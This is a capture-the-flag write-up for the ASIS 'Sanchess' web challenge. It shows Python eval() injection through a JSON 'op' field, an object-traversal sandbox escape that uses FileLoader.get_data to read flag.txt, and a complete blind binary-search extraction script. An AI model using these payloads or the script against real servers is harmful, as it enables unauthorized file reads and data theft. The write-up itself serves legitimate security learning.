**ASIS CTF Final**

**Challenge:** Sanchess

**Category:** Web

**Flag:** ``ASIS{7h!nk_0u7_OF_7h3_B0X_r!cK}``

I participated with tjcsc in this CTF and we got 17th place!

We're given a URL, ``http://65.109.194.105:9090/``.
We also know that the flag is in ``flag.txt``.

## initial exploration

First, let's visit the URL:
![visiting the url](sanchessapp.png)

It's a chess app where we can give Rick up to 10 moves to make.
Interestingly, we can add a condition to the move, which will come in handy later.

For now, let's curl the URL to get the HTML source:
``curl http://65.109.194.105:9090/``

I'll spare you the entire source, but here are the important parts:

We learn that there is a ``/simulate`` endpoint that accepts JSON:
```
const res = await fetch("/simulate", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(payload)
});
```

Here, we can see the format expected at ``/simulate``:
```
if (type === "simple") {
  const dir = block.querySelector(".simple-direction").value;
  moves.push({
    type: "simple",
    direction: dir
  });
} else {
  // ...
  if (condTypeVal === "dist_gt" || condTypeVal === "dist_lt") {
    conditionObj = {
      type: "distance",
      op: condTypeVal === "dist_gt" ? ">" : "<",
      value: xVal
    };
  }
  // ...
  moves.push({
    type: "conditional",
    condition: conditionObj,
    then: thenDir,
    else: elseDir
  });
}
```

OK, now that we have more information, let's try a simple input:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"simple","direction":"down"}]}'
```

This gives us the expected output:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

Now let's try a conditional input.
If the condition evaluates true, Rick moves down to row 6. Otherwise he moves up to row 4. Later, this gives us a boolean oracle.
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">","value":0},"then":"down","else":"up"}]}'
```

Output:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

Alright, none of that was surprising.

However, I see something interesting in the source.

Let's look at how the JSON is sent to the backend from the frontend:
```
conditionObj = {
  type: "distance",
  op: condTypeVal === "dist_gt" ? ">" : "<",
  value: xVal
};
```
```
moves.push({
  type: "conditional",
  condition: conditionObj,
  then: thenDir,
  else: elseDir
});
```
```
const payload = {
  rick: {row: rickStart.row, col: rickStart.col},
  morty: {row: mortyPos.row, col: mortyPos.col},
  moves: moves
};
```
```
const res = await fetch("/simulate", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify(payload)
});
```

So, the frontend only generates ``op`` for either ``<`` or ``>``.
However, the backend may not be limited to those two operators.

Let's try ``==`` to make sure:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":"==","value":5},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 4
    }
  ]
}
```

It worked! Now, let's test for ``eval()`` with a Python comment:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0#","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

That went through too!

## file read via object traversal

Ok, now we know that the backend is using ``eval()`` and accepts more ops than the frontend sends.
Critically, ``eval()`` allows the execution of arbitrary Python expressions, so we might be able to use it to read the flag file!

Let's try to access it using ``open``:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0 if open(\"flag.txt\") else","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "Error": "Invalid Request"
}
```

...Maybe open is filtered somehow. Let's try using something else.

Since Python objects expose their class and base types, which eventually link back to builtins, we can access __import__ without calling it directly.

FileLoader lets us read arbitrary files via ``get_data``, making it perfect for exfiltrating ``flag.txt``:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0 if [x.get_data(\".\",\"flag.txt\") for x in \"\".__class__.__mro__[1].__subclasses__() if \"FileLoader\" in str(x)] else","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```

That worked! We successfully read the flag file, but all the outputs we have access to are "True" or "False..."

## extracting the flag

Maybe we can check individual indexes?
We know the flag format is ASIS{...}, so let's check for A:
```
curl -X POST http://65.109.194.105:9090/simulate \
  -H "Content-Type: application/json" \
  -d '{"rick":{"row":5,"col":4},"morty":{"row":7,"col":2},"moves":[{"type":"conditional","condition":{"type":"distance","op":">0 if [x.get_data(\"/app\",\"flag.txt\")[0]==65 for x in \"\".__class__.__mro__[1].__subclasses__() if \"FileLoader\" in str(x)][0] else","value":0},"then":"down","else":"up"}]}'
```
Response:
```
{
  "path": [
    {
      "col": 4,
      "row": 5
    },
    {
      "col": 4,
      "row": 6
    }
  ]
}
```
We have row 6, meaning the first character is A and we CAN check individual characters!

Now all that's left to do is put together a script that uses a binary search to find each character.
Here's mine:
```
import requests

url = "http://65.109.194.105:9090/simulate"

def check_gt(index, value):
    payload = {
        "rick": {"row": 5, "col": 4},
        "morty": {"row": 7, "col": 2},
        "moves": [{
            "type": "conditional",
            "condition": {
                "type": "distance",
                "op": f'>0 if [x.get_data(".","flag.txt")[{index}]>{value} for x in "".__class__.__mro__[1].__subclasses__() if "FileLoader" in str(x)][0] else',
                "value": 0
            },
            "then": "down",
            "else": "up"
        }]
    }
    r = requests.post(url, json=payload, timeout=10)
    data = r.json()
    return "path" in data and len(data["path"]) > 1 and data["path"][1]["row"] == 6

def get_byte(index):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if check_gt(index, mid):
            low = mid + 1
        else:
            high = mid
    return low

flag = ""
for i in range(50):
    flag += chr(get_byte(i))
    print(flag)
    if flag.endswith("}"):
        break
```

Using this, we get the final output:
``ASIS{7h!nk_0u7_OF_7h3_B0X_r!cK}``

Moral of the story: Don't always trust frontend constraints!
